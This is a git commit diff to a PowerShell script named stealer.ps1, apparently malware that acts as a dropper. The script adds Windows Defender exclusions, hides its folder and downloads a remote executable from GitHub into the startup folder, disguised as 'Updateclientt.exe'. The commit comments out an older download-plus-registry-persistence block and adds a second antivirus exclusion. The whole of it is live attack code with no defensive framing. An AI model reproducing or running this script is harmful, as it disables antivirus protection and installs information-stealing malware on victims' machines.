2ac7041da55062f3d6cdcbe2d1d3628109133c31
43a1723 <hai1723notgay@gmail.com>
2024-12-13 20:53:51 +0700

    Update stealer.ps1

--- shellcode/stealer.ps1
+++ shellcode/stealer.ps1
@@ -6,13 +6,14 @@ New-Item -ItemType Directory -Path $dir
 Add-MpPreference -ExclusionPath $dir
 attrib +h +s $dir
 
-$url = "https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/shellcode/haha.exe"
-$output = "$dir\Mystealer.exe"
-Invoke-WebRequest -Uri $url -OutFile $output
-$regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
-$appName = "StartupUmbreal"
-Set-ItemProperty -Path $regPath -Name $appName -Value "`"$output`""
+# $url = "https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/shellcode/haha.exe"
+# $output = "$dir\Mystealer.exe"
+# Invoke-WebRequest -Uri $url -OutFile $output
+# $regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
+# $appName = "StartupUmbreal"
+# Set-ItemProperty -Path $regPath -Name $appName -Value "`"$output`""
 
 $url = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
 $output = "$startupfolder\Updateclientt.exe"
+Add-MpPreference -ExclusionPath $output
 Invoke-WebRequest -Uri $url -OutFile $output
